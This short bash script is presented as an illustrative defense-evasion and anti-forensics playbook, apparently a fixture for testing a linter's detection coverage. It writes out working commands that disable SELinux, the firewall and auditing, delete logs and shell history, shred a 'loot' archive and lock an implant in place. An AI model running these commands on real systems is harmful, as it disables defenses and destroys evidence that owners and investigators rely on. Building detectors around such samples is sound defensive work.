#!/bin/bash
# Sample defense-evasion / anti-forensics playbook. Illustrative only.
# Demonstrates opseclint coverage of impair-defenses and indicator-removal.

# Disable host defenses
setenforce 0
iptables -F
auditctl -e 0

# Destroy telemetry
rm -rf /var/log/auth.log
journalctl --vacuum-time=1s
shred -u /tmp/loot.tar.gz

# Clear operator tracks
history -c
cat /dev/null >~/.bash_history

# Make an implant hard to remove
chattr +i /usr/local/bin/beacon
